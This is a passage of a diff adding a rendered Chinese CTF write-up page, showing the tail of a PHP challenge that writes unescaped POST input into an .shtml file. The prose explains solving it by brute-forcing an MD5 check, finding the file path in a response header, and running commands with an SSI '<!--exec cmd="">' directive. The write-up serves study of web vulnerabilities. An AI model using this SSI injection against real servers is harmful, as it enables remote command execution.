+            &lt;h1&gt;Hello,'</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span><span class="o">.</span><span class="s1">'&lt;/h1&gt;
+            ***
+			***'</span><span class="p">;</span>
+            <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$shtml</span><span class="p">,</span><span class="nv">$text</span><span class="p">);</span>
+            <span class="nb">fclose</span><span class="p">(</span><span class="nv">$shtml</span><span class="p">);</span>
+            <span class="o">***</span>
+			<span class="k">echo</span> <span class="s2">"[!] Header  error ..."</span><span class="p">;</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="k">echo</span> <span class="s2">"&lt;script&gt;alert('[!] Failed')&lt;/script&gt;"</span><span class="p">;</span>
+            
+    <span class="p">}</span><span class="k">else</span>
+    <span class="p">{</span>
+	<span class="o">***</span>
+    <span class="p">}</span>
+	<span class="o">***</span>
+<span class="cp">?&gt;</span>
+
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>第一个对md5的检验，好像只能爆破，好在明文数字不是很大。然后会保存到shtml文件中，可能是个SSI注入，就是不清楚怎么获得文件路径，难道是爆破？</p>
+
+<p>然后实际操作一下，说我的请求头错了，意识到响应头可能有信息。抓包看看，果然，是文件路径。然后访问stml文件，试试SSI注入，发现没什么过滤，直接用<code class="highlighter-rouge">&lt;!--exec cmd=""&gt;</code>执行命令，获得flag。</p>
+
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            
+            <a href="/tag/#/CTF" rel="tag"># CTF</a>
+          
+            
+            <a href="/tag/#/Writeup" rel="tag"># Writeup</a>
+          
+        </div>
+      
+
+      
+      
+      
+      
+      
+
+      
+      
+        <div class="post-nav" id="post-nav-id">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/notes/2020/01/18/SSI-Injection/" rel="next" title="SSI注入总结">
+                <i class="fa fa-chevron-left"></i> SSI注入总结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/notes/2020/01/16/Common-Protocols/" rel="prev" title="常见的协议">
+                常见的协议 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+      
+
+      
+    </footer>
+  </article>
+
+  <div class="post-spread">
+    
+  </div>
+</div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+        
+        
+        
+
+
+
+
+
+
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/uploads/avatar.jpg"
+               alt="Asinose" />
+          <p class="site-author-name" itemprop="name">Asinose</p>
+           
+              <p class="site-description motion-element" itemprop="description">flag{f14g_1s_n0t_h3r3}</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">20</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/">
+                <span class="site-state-item-count">2</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/">
+                <span class="site-state-item-count">14</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+        
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+
+
+
+
+
+
+
+            
+              <div class="post-toc-content">
+    <ol class=nav>
+      <li class="nav-item nav-level-1"> <a class="nav-link" href="#hello_world"> <span class="nav-number">1</span> <span class="nav-text">hello_world</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-2"> <a class="nav-link" href="#解题思路"> <span class="nav-number">1.1</span> <span class="nav-text">解题思路</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#备注"> <span class="nav-number">1.2</span> <span class="nav-text">备注</span> </a> </li> </ol> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#easy_upload"> <span class="nav-number">2</span> <span class="nav-text">easy_upload</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-2"> <a class="nav-link" href="#解题思路-1"> <span class="nav-number">2.1</span> <span class="nav-text">解题思路</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#备注-1"> <span class="nav-number">2.2</span> <span class="nav-text">备注</span> </a> </li> </ol> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#hidden-secrets"> <span class="nav-number">3</span> <span class="nav-text">Hidden secrets</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-2"> <a class="nav-link" href="#解题思路-2"> <span class="nav-number">3.1</span> <span class="nav-text">解题思路</span> </a> </li> </ol> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#easy_md5"> <span class="nav-number">4</span> <span class="nav-text">easy_md5</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-2"> <a class="nav-link" href="#解题思路-3"> <span class="nav-number">4.1</span> <span class="nav-text">解题思路</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#备注-2"> <span class="nav-number">4.2</span> <span class="nav-text">备注</span> </a> </li> </ol> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#mark-loves-cat"> <span class="nav-number">5</span> <span class="nav-text">Mark loves cat</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-2"> <a class="nav-link" href="#解题思路-4"> <span class="nav-number">5.1</span> <span class="nav-text">解题思路</span> </a> </li> </ol> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#这序列化也太简单了吧"> <span class="nav-number">6</span> <span class="nav-text">这序列化也太简单了吧</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-2"> <a class="nav-link" href="#解题思路-5"> <span class="nav-number">6.1</span> <span class="nav-text">解题思路</span> </a> </li> </ol> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#zjctf就这"> <span class="nav-number">7</span> <span class="nav-text">ZJCTF，就这？</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-2"> <a class="nav-link" href="#解题思路-6"> <span class="nav-number">7.1</span> <span class="nav-text">解题思路</span> </a> </li> </ol> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#the-mystery-of-ip"> <span class="nav-number">8</span> <span class="nav-text">The Mystery of IP</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-2"> <a class="nav-link" href="#解题思路-7"> <span class="nav-number">8.1</span> <span class="nav-text">解题思路</span> </a> </li> </ol> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#easy_serialize"> <span class="nav-number">9</span> <span class="nav-text">easy_serialize</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-2"> <a class="nav-link" href="#解题思路-8"> <span class="nav-number">9.1</span> <span class="nav-text">解题思路</span> </a> </li> </ol> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#easy_search"> <span class="nav-number">10</span> <span class="nav-text">easy_search</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-2"> <a class="nav-link" href="#解题思路-9"> <span class="nav-number">10.1</span> <span class="nav-text">解题思路</span> </a> </li> </ol> </li>
+    </ol>
+  </div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  
+  &copy;  2019 - 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Asinose</span>
+</div>
+
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+   
+  
+  
+  
+  
+  
+  <script type="text/javascript" src="/assets/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+  
+  
+  
+  <script type="text/javascript" src="/assets/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  
+  
+  
+  
+  <script type="text/javascript" src="/assets/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  
+  
+  
+  
+  <script type="text/javascript" src="/assets/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  
+  
+  
+  
+  <script type="text/javascript" src="/assets/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  
+  
+  
+  
+  <script type="text/javascript" src="/assets/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/assets/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/assets/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/assets/js/src/affix.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/assets/js/src/schemes/pisces.js?v=5.1.1"></script>
+
+
+
+  <script type="text/javascript" src="/assets/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/assets/js/src/post-details.js?v=5.1.1"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/assets/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+
+    
+
+  
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+  
+
+  
+  
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
+
